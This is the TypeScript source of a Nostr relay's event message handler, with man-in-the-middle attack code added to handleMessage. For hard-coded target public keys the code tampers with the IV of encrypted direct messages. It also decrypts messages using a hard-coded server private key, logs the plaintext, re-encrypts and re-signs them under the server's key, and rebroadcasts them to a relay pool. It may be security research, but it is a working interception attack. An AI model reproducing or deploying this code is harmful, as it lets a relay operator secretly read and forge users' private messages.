import {Event, ExpiringEvent, RelayedEvent} from '../@types/event'
import {EventRateLimit, FeeSchedule, Settings} from '../@types/settings'
import {
  getEventExpiration,
  getEventHash,
  getEventProofOfWork,
  getPubkeyProofOfWork,
  getPublicKey,
  isEventIdValid,
  isEventKindOrRangeMatch,
  isEventSignatureValid,
  isExpiredEvent,
  broadcastEvent,
} from '../utils/event'
import {IEventStrategy, IMessageHandler} from '../@types/message-handlers'
import {ContextMetadataKey, EventExpirationTimeMetadataKey, EventKinds} from '../constants/base'
import {createCommandResult} from '../utils/messages'
import {createLogger} from '../factories/logger-factory'
import {Factory} from '../@types/base'
import {IncomingEventMessage} from '../@types/messages'
import {IRateLimiter} from '../@types/utils'
import {IUserRepository} from '../@types/repositories'
import {IWebSocketAdapter} from '../@types/adapters'
import {WebSocketAdapterEvent} from '../constants/adapter'
import * as secp256k1 from '@noble/secp256k1'
import {createCipheriv, createDecipheriv , getRandomValues, randomFillSync} from 'crypto'
import clone from 'clone'

import {RelayPool} from 'nostr'



const debug = createLogger('event-message-handler')

export class EventMessageHandler implements IMessageHandler {
  public constructor(
    protected readonly webSocket: IWebSocketAdapter,
    protected readonly strategyFactory: Factory<IEventStrategy<Event, Promise<void>>, [Event, IWebSocketAdapter]>,
    protected readonly userRepository: IUserRepository,
    private readonly settings: () => Settings,
    private readonly slidingWindowRateLimiter: Factory<IRateLimiter>,
  ) {}

  private async SendDuplicatedEventToMyself(event: Event){
    // eslint-disable-next-line @typescript-eslint/ban-ts-comment
    // @ts-ignore
    /*const relay = relayInit('wss://test.osushi.dev')
    const pub = relay.publish(event)
    pub.on('ok', () => {
      console.log(`${relay.url} has accepted our event`)
    })
    pub.on('failed', reason => {
      console.log(`failed to publish to ${relay.url}: ${reason}`)
    })*/
    /*
    console.log('call SendDuplicatedEventToMyself')
    const e: NostrEvent ={
      id: event.id,
      sig: event.sig,
      kind: event.kind,
      tags: event.tags,
      pubkey: event.pubkey,
      content: event.content,
      created_at: event.created_at,
    }

    console.log('setup NostrEvent')
    initNostr({
      relayUrls: [
        'ws://localhost',
      ],
      onConnect: (relayUrl, sendEvent) => {
        console.log('Nostr connected to:', relayUrl)

        // Send a REQ event to start listening to events from that relayer:
        sendEvent([SendMsgType.EVENT,
          e,
        ], relayUrl)
      },
      onEvent: (relayUrl, event) => {
        console.log('Nostr received event:', event)
      },
      onError: (relayUrl, event) => {
        console.log('Nostr error event:', event)
      },
      debug: true, // Enable logs
    })

    console.log('called initNostr')
    */
    const relays = [
        'ws://localhost',
    ]
    const pool = RelayPool(relays)
    pool.on('open', relay => {
      const send_event = ['EVENT', event]
      relay.send(send_event)
    });

    pool.on('eose', relay => {
      relay.close()
    });

    pool.on('event', (relay, sub_id, ev) => {
      console.log(ev)
    });
  }

  public async handleMessage(message: IncomingEventMessage): Promise<void> {
    let [, event] = message

    event[ContextMetadataKey] = message[ContextMetadataKey]


    console.log('-----------Receive event0')
    console.log(event)

    let reason = await this.isEventValid(event)
    if (reason) {
      debug('event %s rejected: %s', event.id, reason)
      this.webSocket.emit(WebSocketAdapterEvent.Message, createCommandResult(event.id, false, reason))
      return
    }


    console.log('-----------Receive event1')

    if (isExpiredEvent(event)) {
      debug('event %s rejected: expired')
      this.webSocket.emit(WebSocketAdapterEvent.Message, createCommandResult(event.id, false, 'event is expired'))
      return
    }

    console.log('-----------Receive event2')
    event = this.addExpirationMetadata(event)

    if (await this.isRateLimited(event)) {
      debug('event %s rejected: rate-limited')
      this.webSocket.emit(WebSocketAdapterEvent.Message, createCommandResult(event.id, false, 'rate-limited: slow down'))
      return
    }


    console.log('-----------Receive event3')

    reason = this.canAcceptEvent(event)
    if (reason) {
      debug('event %s rejected: %s', event.id, reason)
      this.webSocket.emit(WebSocketAdapterEvent.Message, createCommandResult(event.id, false, reason))
      return
    }


    console.log('-----------Receive event4')
    //do MITM on Subscribe contact list
    if(event.kind == EventKinds.SET_METADATA) {

      console.log('SET_METADATA event')
      console.log(event)
    }


    //do MITM on Subscribe contact list
    if(event.kind == EventKinds.CONTACT_LIST) {

      console.log('CONTACT_LIST event')
      console.log(event)
    }


    // do MITM on EncryptedDM
    const server_privKey = '72434ed46eecea6d09c2cf139014cc27a8fb0cdb7cd55ad13fdbc0fb1ad4fd80'
    const target_pub = '24f235e8a1f16dcfb85c95a7387ff0618251981c7448a84a08ed8058d32b4d6d' // for npub1ynert...
    const target_pub2 = '2c62a6ba421347b19b25812a509e7cac4558162ce3f5ede27b1d0b722a531207' //
    if(event.kind == EventKinds.ENCRYPTED_DIRECT_MESSAGE){

      console.log('event')
      console.log(event)
      console.log('receiver pubkey:')
      console.log(event.tags)




      if(event.pubkey==target_pub){
        if(event.tags[0][1]==target_pub2){

          console.log('event: MITM with breaking integrity')
          console.log(event)

          const encryptedMessageParts = event.content.split('?iv=')
          const senderMessage_enctrypted = encryptedMessageParts[0]
          const iv_ = Buffer.from(encryptedMessageParts[1], 'base64')
          iv_.fill(2, 1, 2)

          event.content = `${senderMessage_enctrypted}?iv=${Buffer.from(iv_).toString('base64')}`
        }
      }

      if(event.tags[0][1]==getPublicKey(server_privKey)){

        const limits = this.settings().limits?.event ?? {}

        if (
            typeof limits.pubkey?.serverKeyPairList === 'undefined'
        ){
          limits.pubkey.serverKeyPairList = {}
        }

        /*if (
          typeof limits.pubkey?.mitmList === 'undefined'
        ){
          limits.pubkey.mitmList = {}
          // eslint-disable-next-line max-len
          const server_privkey = '72434ed46eecea6d09c2cf139014cc27a8fb0cdb7cd55ad13fdbc0fb1ad4fd80'// Buffer.from(secp256k1.utils.randomPrivateKey()).toString('hex')
          limits.pubkey.mitmList[event.pubkey] = server_privkey
          limits.pubkey.serverKeyPairList[getPublicKey(server_privkey)] = server_privkey
        }
        else{
            // eslint-disable-next-line no-prototype-builtins
            if(!limits.pubkey.mitmList.hasOwnProperty(event.pubkey))
            {
              const server_privkey = Buffer.from(secp256k1.utils.randomPrivateKey()).toString('hex')
              limits.pubkey.mitmList[event.pubkey] = server_privkey
              limits.pubkey.serverKeyPairList[getPublicKey(server_privkey)] = server_privkey
            }
        }*/

        // eslint-disable-next-line no-prototype-builtins
        /*if(!limits.pubkey.mitmList.hasOwnProperty(event.tags[0]['p']))
        {*/
          //const server_privkey = Buffer.from(secp256k1.utils.randomPrivateKey()).toString('hex')
          //limits.pubkey.mitmList[event.tags[0]['p']] = server_privkey
          //limits.pubkey.serverKeyPairList[getPublicKey(server_privkey)] = server_privkey
        //}
        //const serverPrivKey = limits.pubkey.serverKeyPairList[event.tags[0]['p']]
        /*const deckey = secp256k1
            .getSharedSecret(server_privKey, `02${event.pubkey}`, true)
            .subarray(1)*/


        /*
        const sharedPoint = secp256k1.getSharedSecret(server_privKey, '02' + event.pubkey)
        const deckey = sharedPoint.slice(1, 33)

        const ciphertext = event.content.split('?')[0]
        const urlParams = new URLSearchParams('?'+event.content.split('?')[1])
        const ivStr = urlParams.get('iv')
        const iv = Buffer.from(ivStr, 'base64')

        console.log('iv:')
        console.log(ivStr)

        // deepcode ignore InsecureCipherNoIntegrity: NIP-04 Encrypted Direct Message uses aes-256-cbc
        const cipher = createDecipheriv(
            'aes-256-cbc',
            Buffer.from(deckey),
            iv,
        )
        const decryptedData = cipher.update(ciphertext, 'utf8', 'base64')
        */

        const encryptedMessageParts = event.content.split('?iv=')
        const senderMessage_enctrypted = encryptedMessageParts[0]
        const iv_ = Buffer.from(encryptedMessageParts[1], 'base64')
        const sharedPoint = secp256k1.getSharedSecret(server_privKey, '02' + event.pubkey)
        const sharedX = sharedPoint.slice(1, 33)
        const decipher = createDecipheriv(
            'aes-256-cbc',
            Buffer.from(sharedX),
            iv_
        )
        let senderMessage_decrypted = decipher.update(
            senderMessage_enctrypted,
            'base64',
            'utf8'
        )

        console.log('decryptedData:')
        senderMessage_decrypted += decipher.final('utf8')
        console.log(senderMessage_decrypted)
        //console.log(decryptedData)

        /*const enckey = secp256k1
            .getSharedSecret(server_privKey, `02${target_pub}`, true)
            .subarray(1)
         */

        /*
        const sharedPoint2 = secp256k1.getSharedSecret(server_privKey, '02' + target_pub)
        const enckey = sharedPoint2.slice(1, 33)

        const ivEnc = getRandomValues(new Uint8Array(16))

        // deepcode ignore InsecureCipherNoIntegrity: NIP-04 Encrypted Direct Message uses aes-256-cbc
        const cipherEnc = createCipheriv(
            'aes-256-cbc',
            Buffer.from(enckey),
            ivEnc,
        )

        let content = cipherEnc.update(senderMessage_decrypted, 'utf8', 'base64')
        content += cipherEnc.final('base64')
        content += '?iv=' + Buffer.from(ivEnc.buffer).toString('base64')
        event.content = content

         */


        const key = secp256k1.getSharedSecret(server_privKey, '02' + target_pub)
        const normalizedKey = Buffer.from(key.slice(1, 33)).toString('hex')

        const iv = randomFillSync(new Uint8Array(16))
        const cipher = createCipheriv('aes-256-cbc', Buffer.from(normalizedKey, 'hex'), iv)
        let encryptedMessage = cipher.update(senderMessage_decrypted, 'utf8', 'base64')
        encryptedMessage += cipher.final('base64')

        /*
        const sharedPoint2 = secp256k1.getSharedSecret(server_privKey, '02' + target_pub)
        const sharedX2 = sharedPoint2.slice(1, 33)

        const enc_iv = randomFillSync(new Uint8Array(16))
        const encCipher = createCipheriv(
            'aes-256-cbc',
            Buffer.from(sharedX2),
            enc_iv
        )
        let encryptedMessage = encCipher.update(senderMessage_decrypted, 'utf8', 'base64')
        encryptedMessage += encCipher.final('base64')
        const ivBase64 = Buffer.from(enc_iv.buffer).toString('base64')
        */
        let mitmEvent = clone(event)

        mitmEvent.pubkey = getPublicKey(server_privKey)
        mitmEvent.tags = [['p', target_pub]]
        mitmEvent.content = `${encryptedMessage}?iv=${Buffer.from(iv.buffer).toString('base64')}`

        const newid = await getEventHash(mitmEvent)
        const newsig = await secp256k1.schnorr.sign(newid, server_privKey)

        mitmEvent = {
          id: newid,
          pubkey: mitmEvent.pubkey,
          created_at: mitmEvent.created_at,
          kind: mitmEvent.kind,
          tags: mitmEvent.tags,
          sig: Buffer.from(newsig).toString('hex'),
          content:mitmEvent.content,
        }

        mitmEvent.tags[0][1]=target_pub

        /*const mitmEvent: RelayedEvent = {
          id: newid,
          pubkey: getPublicKey(server_privKey),
          created_at: event.created_at,
          kind: event.kind,
          tags: event.tags,
          sig: Buffer.from(newsig).toString('hex'),
          content: event.content,
        }*/

        //this.webSocket.emit(WebSocketAdapterEvent.Message, mitmEvent)
        //this.webSocket.emit(WebSocketAdapterEvent.Event, mitmEvent)
        this.SendDuplicatedEventToMyself(mitmEvent)
        event = mitmEvent

        console.log('original-event')
        console.log(event)
        console.log('MITM-event')
        console.log(mitmEvent)
      }
    }

    //end setting for MITM

    reason = await this.isUserAdmitted(event)
    if (reason) {
      debug('event %s rejected: %s', event.id, reason)
      this.webSocket.emit(WebSocketAdapterEvent.Message, createCommandResult(event.id, false, reason))
      return
    }

    const strategy = this.strategyFactory([event, this.webSocket])

    if (typeof strategy?.execute !== 'function') {
      this.webSocket.emit(WebSocketAdapterEvent.Message, createCommandResult(event.id, false, 'error: event not supported'))
      return
    }

    try {
      await strategy.execute(event)
    } catch (error) {
      console.error('error handling message', message, error)
      this.webSocket.emit(WebSocketAdapterEvent.Message, createCommandResult(event.id, false, 'error: unable to process event'))
    }
  }

  protected canAcceptEvent(event: Event): string | undefined {
    const now = Math.floor(Date.now()/1000)

    const limits = this.settings().limits?.event ?? {}

    if (Array.isArray(limits.content)) {
      for (const limit of limits.content) {
        if (
          typeof limit.maxLength !== 'undefined'
          && limit.maxLength > 0
          && event.content.length > limit.maxLength
          && (
            !Array.isArray(limit.kinds)
            || limit.kinds.some(isEventKindOrRangeMatch(event))
          )
        ) {
          return `rejected: content is longer than ${limit.maxLength} bytes`
        }
      }
    } else if (
      typeof limits.content?.maxLength !== 'undefined'
      && limits.content?.maxLength > 0
      && event.content.length > limits.content.maxLength
      && (
        !Array.isArray(limits.content.kinds)
        || limits.content.kinds.some(isEventKindOrRangeMatch(event))
      )
    ) {
      return `rejected: content is longer than ${limits.content.maxLength} bytes`
    }

    if (
      typeof limits.createdAt?.maxPositiveDelta !== 'undefined'
      && limits.createdAt.maxPositiveDelta > 0
      && event.created_at > now + limits.createdAt.maxPositiveDelta) {
      return `rejected: created_at is more than ${limits.createdAt.maxPositiveDelta} seconds in the future`
    }

    if (
      typeof limits.createdAt?.maxNegativeDelta !== 'undefined'
      && limits.createdAt.maxNegativeDelta > 0
      && event.created_at < now - limits.createdAt.maxNegativeDelta) {
      return `rejected: created_at is more than ${limits.createdAt.maxNegativeDelta} seconds in the past`
    }

    if (
      typeof limits.eventId?.minLeadingZeroBits !== 'undefined'
      && limits.eventId.minLeadingZeroBits > 0
    ) {
      const pow = getEventProofOfWork(event.id)
      if (pow < limits.eventId.minLeadingZeroBits) {
        return `pow: difficulty ${pow}<${limits.eventId.minLeadingZeroBits}`
      }
    }

    if (
      typeof limits.pubkey?.minLeadingZeroBits !== 'undefined'
      && limits.pubkey.minLeadingZeroBits > 0
    ) {
      const pow = getPubkeyProofOfWork(event.pubkey)
      if (pow < limits.pubkey.minLeadingZeroBits) {
        return `pow: pubkey difficulty ${pow}<${limits.pubkey.minLeadingZeroBits}`
      }
    }

    if (
      typeof limits.pubkey?.whitelist !== 'undefined'
      && limits.pubkey.whitelist.length > 0
      && !limits.pubkey.whitelist.some((prefix) => event.pubkey.startsWith(prefix))
    ) {
      return 'blocked: pubkey not allowed'
    }

    if (
      typeof limits.pubkey?.blacklist !== 'undefined'
      && limits.pubkey.blacklist.length > 0
      && limits.pubkey.blacklist.some((prefix) => event.pubkey.startsWith(prefix))
    ) {
      return 'blocked: pubkey not allowed'
    }

    if (
      typeof limits.kind?.whitelist !== 'undefined'
      && limits.kind.whitelist.length > 0
      && !limits.kind.whitelist.some(isEventKindOrRangeMatch(event))) {
      return `blocked: event kind ${event.kind} not allowed`
    }

    if (
      typeof limits.kind?.blacklist !== 'undefined'
      && limits.kind.blacklist.length > 0
      && limits.kind.blacklist.some(isEventKindOrRangeMatch(event))) {
      return `blocked: event kind ${event.kind} not allowed`
    }
    
  }

  protected async isEventValid(event: Event): Promise<string | undefined> {
    if (!await isEventIdValid(event)) {
      return 'invalid: event id does not match'
    }
    if (!await isEventSignatureValid(event)) {
      return 'invalid: event signature verification failed'
    }
  }

  protected async isRateLimited(event: Event): Promise<boolean> {
    const { whitelists, rateLimits } = this.settings().limits?.event ?? {}
    if (!rateLimits || !rateLimits.length) {
      return false
    }

    if (
      typeof whitelists?.pubkeys !== 'undefined'
      && Array.isArray(whitelists?.pubkeys)
      && whitelists.pubkeys.includes(event.pubkey)
    ) {
      return false
    }

    if (
      typeof whitelists?.ipAddresses !== 'undefined'
      && Array.isArray(whitelists?.ipAddresses)
      && whitelists.ipAddresses.includes(this.webSocket.getClientAddress())
    ) {
      return false
    }

    const rateLimiter = this.slidingWindowRateLimiter()

    const toString = (input: any | any[]): string => {
      return Array.isArray(input) ? `[${input.map(toString)}]` : input.toString()
    }

    const hit = ({ period, rate, kinds = undefined }: EventRateLimit) => {
      const key = Array.isArray(kinds)
        ? `${event.pubkey}:events:${period}:${toString(kinds)}`
        : `${event.pubkey}:events:${period}`

      return rateLimiter.hit(
        key,
        1,
        { period, rate },
      )
    }

    let limited = false
    for (const { rate, period, kinds } of rateLimits) {
      // skip if event kind does not apply
      if (Array.isArray(kinds) && !kinds.some(isEventKindOrRangeMatch(event))) {
        continue
      }

      const isRateLimited = await hit({ period, rate, kinds })

      if (isRateLimited) {
        debug('rate limited %s: %d events / %d ms exceeded', event.pubkey, rate, period)

        limited = true
      }
    }

    return limited
  }

  protected async isUserAdmitted(event: Event): Promise<string | undefined> {
    const currentSettings = this.settings()
    if (!currentSettings.payments?.enabled) {
      return
    }

    const isApplicableFee = (feeSchedule: FeeSchedule) =>
      feeSchedule.enabled
      && !feeSchedule.whitelists?.pubkeys?.some((prefix) => event.pubkey.startsWith(prefix))

    const feeSchedules = currentSettings.payments?.feeSchedules?.admission?.filter(isApplicableFee)
    if (!Array.isArray(feeSchedules) || !feeSchedules.length) {
      return
    }

    // const hasKey = await this.cache.hasKey(`${event.pubkey}:is-admitted`)
    // TODO: use cache
    const user = await this.userRepository.findByPubkey(event.pubkey)
    if (!user || !user.isAdmitted) {
      return 'blocked: pubkey not admitted'
    }

    const minBalance = currentSettings.limits?.event?.pubkey?.minBalance ?? 0n
    if (minBalance > 0n && user.balance < minBalance) {
      return 'blocked: insufficient balance'
    }
  }

  protected addExpirationMetadata(event: Event): Event | ExpiringEvent {
    const eventExpiration: number = getEventExpiration(event)
    if (eventExpiration) {
        const expiringEvent: ExpiringEvent = {
          ...event,
          [EventExpirationTimeMetadataKey]: eventExpiration,
        }
        return expiringEvent
    } else {
      return event
    }
  }
}
